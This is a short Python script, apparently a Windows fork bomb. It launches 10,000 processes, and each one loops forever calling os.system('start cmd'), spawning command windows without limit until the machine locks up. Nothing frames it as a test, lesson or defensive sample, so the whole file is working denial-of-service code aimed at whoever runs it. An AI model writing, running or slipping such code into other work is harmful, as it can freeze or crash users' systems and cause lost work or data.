from multiprocessing import Process
from multiprocessing import freeze_support
import os


def cmd():
    while True:
        a = os.system('start cmd')


processes = []
if __name__ == '__main__':
    freeze_support()
    for i in range(10000):
        first = Process(target=cmd)
        first.start()
        processes.append(first)

    for process in processes:
        process.join()
